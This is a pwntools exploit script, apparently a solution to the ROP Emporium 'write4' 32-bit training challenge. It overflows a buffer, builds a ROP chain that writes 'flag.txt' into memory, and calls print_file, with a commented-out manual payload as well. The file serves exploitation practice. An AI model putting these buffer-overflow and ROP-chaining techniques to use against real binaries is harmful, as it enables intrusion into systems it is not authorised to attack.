import time

from pwn import *


EXECUTABLE = "./write432"
context.binary = elf = ELF(EXECUTABLE)
lib_write4 = ELF("./libwrite432.so")


p = process(EXECUTABLE)

OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

mov_ptr_edi_ebp = elf.symbols.usefulGadgets # mov dword ptr [edi], ebp; ret;
flag_addr = elf.symbols.data_start
filename  = b"flag.txt" + b"\x00" * 4

rop = ROP(elf)
# Load string into memory
for i in range(len(filename) // 4):
    rop(edi=flag_addr + i*4, ebp=filename[i*4:(i+1)*4])
    rop.raw(mov_ptr_edi_ebp)
# Call print_file
rop.print_file(flag_addr)

log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))

# Manual solution
# payload  = b"A" * OFFSET
# # Load string into memory
# for i in range(len(filename) // 4):
#     payload += p32(rop.edi_ebp.address) + p32(flag_addr + i*4) + filename[i*4:(i+1)*4]
#     payload += p32(mov_ptr_edi_ebp)
# # Call print file
# payload += p32(elf.plt.print_file) + b"AAAA" + p32(flag_addr)

# p.sendafter(b"> ", payload)


p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
